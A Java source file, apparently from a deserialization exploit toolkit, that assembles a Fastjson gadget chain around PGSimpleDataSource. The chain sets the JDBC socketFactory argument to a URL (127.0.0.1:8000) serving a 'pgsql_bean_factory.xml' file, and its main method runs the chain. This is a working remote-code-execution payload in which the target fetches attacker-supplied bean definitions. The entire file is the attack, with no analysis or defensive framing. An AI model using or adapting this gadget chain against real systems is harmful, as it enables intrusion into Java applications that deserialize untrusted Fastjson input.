import common.Util;
import gadgets.*;

public class Fastjson4_PGSimpleDataSource {
    public Object getObject ( String socketFactoryArg) throws Exception {

        Object node1 = PGSimpleDataSourceNode.makeGadget(socketFactoryArg);
        Object node2 = JsonArrayNode.makeGadget(2,node1);
        Object node3 = BadAttrValExeNode.makeGadget(node2);
        Object[] array = new Object[]{node1,node3};
        Object node4 = HashMapNode.makeGadget(array);
        return node4;
    }

    public static void main(String[] args) throws Exception {
        String socketFactoryArg = "http://127.0.0.1:8000/pgsql_bean_factory.xml";
        Object object = new Fastjson4_PGSimpleDataSource().getObject(socketFactoryArg);
        Util.runGadgets(object);
    }
}
